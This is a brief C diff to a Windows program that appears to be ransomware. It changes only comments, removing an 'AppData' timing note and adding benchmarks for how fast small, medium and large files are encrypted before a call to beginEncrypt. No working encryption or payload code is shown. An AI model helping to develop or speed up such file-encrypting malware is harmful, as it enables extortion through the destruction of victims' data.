@@ -24,7 +24,7 @@ int beginEncrypt() {
 	free(driveBuffer);
 	return 0;
 }
-//2:30 for AppData
+
 int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
 	if (initAPIArray() == -1) {
 		return -1;
@@ -42,6 +42,11 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
 		cleanExplorerLL();
 		return -1;
 	}
+
+	// 10387 small files -> 15039 ms to encrypt small files
+	// 53 medium files -> 6237 ms to encrypt medium files
+	// 25 large files -> 25000 ms to encrypt large files
+
 	beginEncrypt();
 	cleanUpThread();
 	cryptCleanUp();
